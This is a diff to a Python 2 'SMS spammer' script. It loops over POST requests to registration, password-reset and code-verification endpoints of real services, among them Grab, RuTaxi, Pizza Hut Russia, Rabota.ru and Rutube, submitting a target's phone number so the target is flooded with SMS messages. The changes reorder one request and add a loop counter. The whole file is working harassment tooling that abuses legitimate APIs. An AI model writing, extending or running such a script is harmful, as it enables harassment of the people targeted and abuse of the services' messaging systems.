@@ -39,6 +39,7 @@ class spymer:
 		print showstatus(wrapsbrace('info', True) + ('Send SMS to: +{}').format(_phone))
 		print 'Spammer started.\nIf you want to stop - press Ctrl+Z.'
 		i = 1
+		iteration = 0
 		while i < 10:
 			grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
 			rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
@@ -59,11 +60,13 @@ class spymer:
 			pizzahut = requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
 			rabota = requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
 			drugvokrug = requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': _phone})
+			rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
 			if _name == None:
 				smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name':'Hackers','phone': _phone})
 			else:
 				smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone})
-			rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
+			iteration += 1
+			print ('{} circle passed.').format(iteration)
 
 spammer = spymer()
 spammer.main()
